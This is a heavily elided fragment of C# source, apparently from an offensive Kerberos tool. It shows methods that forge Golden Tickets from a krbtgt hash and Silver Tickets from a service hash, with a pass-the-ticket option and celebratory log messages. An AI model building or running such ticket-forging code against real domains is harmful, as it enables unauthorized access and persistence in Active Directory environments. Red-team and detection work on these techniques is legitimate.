    ...
    class BuildTicket
    {
            ...
            bool ptt = false, bool verbose = false)
        {
            ...
            if (verbose)
            {
                ...
                logger.Info("[*] Decrypting Golden Ticket ...");
                Displayer.PrintTicketEnc(de);
            }

            logger.Info("[*] Now you have a Golden Ticket!");



            var kirbiTGT = Kirbi.GetKirbi(goldenTicket, krbtgtHash, etype, ptt, verbose);

            logger.Info("[+] Done! Now enjoy your ticket.");
        ...
        public static KrbTicket BuildSilver(string srvName, string srvHash, EncryptionType etype, string username, string realm, string service, string domainsid,
            bool ptt = false, bool verbose = false)
        {
            var now = DateTime.UtcNow.AddTicks(-(DateTime.Now.Ticks % TimeSpan.TicksPerSecond));
            ...
            if (verbose)
            {
                ...
                logger.Info("   * [Decrypted SliverTicket Ticket]:");
                Displayer.PrintTicketEnc(de);
            }



            logger.Info("[*] Now you have a Sliver Ticket!");
